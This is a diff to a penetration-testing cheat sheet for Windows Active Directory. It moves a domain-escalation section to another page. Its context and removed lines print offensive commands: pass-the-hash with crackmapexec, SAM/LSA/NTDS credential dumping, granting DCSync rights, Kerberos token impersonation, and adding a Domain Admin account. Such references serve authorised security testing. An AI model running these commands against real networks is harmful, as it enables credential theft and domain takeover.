@@ -32,7 +32,7 @@ impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY -local
 
 nmap
 
-```bash
+```sh
 nmap -Pn -n -sSUV -n -vvv --reason -pT:137-139,445,U:137-139 -oA SMB <hosts>
 nmap --version-all -sV -sC -oA top1000 <hosts>
 nmap --version-all -sV -sC -p- -oA allports <hosts>
@@ -219,59 +219,9 @@ crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --lsa
 
 See next cheatsheet Pivoting
 
-### **Domain escalation**
+### Domain escalation
 
-Remote GUI domain \(RSAT\)
-
-* [https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT\_WS\_1709-x64.msu](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu) \(Users and Computers AD =&gt; View =&gt; Advanced\)
-
-ACLs
-
-Get ACL
-
-```bash
-Get-DomainObjectAcl -Identity <username> -ResolveGUIDs ? { $_.SecurityIdentifier -Match $(ConvertTo-SID <domain>) }
-```
-
-add DCSync
-
-```bash
-Add-DomainObjectAcl -TargetIdentity "DC=<domain>,DC=<local>" -PrincipalIdentity <username> -Rights DCSync
-```
-
-dump ntds 
-
-```bash
-meterpreter > dcsync_ntlm <DOMAIN>\<user>
-```
-
-**Kerberos impersonate**
-
-Find domain admin accounts 
-
-```bash
-net group "Domain Admins" /DOMAIN
-```
-
-Find which if one is loggedin somewhere :
-
-```bash
-crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --loggedin
-```
-
-Impersonate his kerberos token
-
-```bash
-Rubeus.exe
-incongnito (meterpreter)
-```
-
-Create new Domain Admin account 
-
-```bash
-net user add <user> <pass> /domain
-net group "Domain Admins" <user> /add
-```
+See next cheatsheet Domain Escalation
 
 ## Domain admin account
 
@@ -280,6 +230,3 @@ net group "Domain Admins" <user> /add
 ```bash
 cme smb 192.168.1.100 -u <domain_admin> -p '<pass>' --ntds
 ```
-
-
-
